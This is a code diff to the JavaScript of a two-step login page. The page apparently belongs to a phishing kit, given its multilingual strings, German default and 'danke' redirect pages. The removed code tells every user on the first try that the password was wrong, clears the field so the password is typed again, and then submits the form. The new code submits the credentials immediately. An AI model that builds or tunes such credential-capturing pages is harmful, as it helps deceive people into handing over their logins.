@@ -39,13 +39,10 @@ document.addEventListener("DOMContentLoaded", function () {
 
   const usernameInput = document.getElementById("username");
   const passwordInput = document.getElementById("password");
-  const passwordError = document.getElementById("password-error");
 
   const step1Button = document.getElementById("step1-button");
   const step2Button = document.getElementById("step2-button");
   const form = document.querySelector("form");
-
-  let firstTry = true;
 
   function validateStep1() {
     step1Button.disabled = usernameInput.value.trim() === "";
@@ -71,49 +68,12 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   if (step1Button) validateStep1();
+
   if (step2Button) {
     validateStep2();
     step2Button.addEventListener("click", function (e) {
       e.preventDefault();
-
-      const messages = {
-        de: "Falsches Passwort",
-        en: "Incorrect password",
-        fr: "Mot de passe incorrect",
-        es: "Contraseña incorrecta"
-      };
-
-      const langSelect = document.getElementById("language") || document.getElementById("language-desktop") || document.getElementById("language-mobile");
-      const selectedLang = langSelect ? langSelect.value : "de";
-
-      if (firstTry) {
-        passwordError.textContent = messages[selectedLang] || messages["de"];
-        passwordError.style.display = "block";
-        passwordInput.value = "";
-        passwordInput.focus();
-        validateStep2();
-        firstTry = false;
-      } else {
-        passwordError.style.display = "none";
-
-        let target = "danke.html";
-        switch (selectedLang) {
-          case "en":
-            target = "danke_en.html";
-            break;
-          case "fr":
-            target = "danke_fr.html";
-            break;
-          case "es":
-            target = "danke_es.html";
-            break;
-          case "de":
-          default:
-            target = "danke.html";
-        }
-
-        form.submit();
-      }
+      form.submit(); // Sofortiges Absenden
     });
   }
 
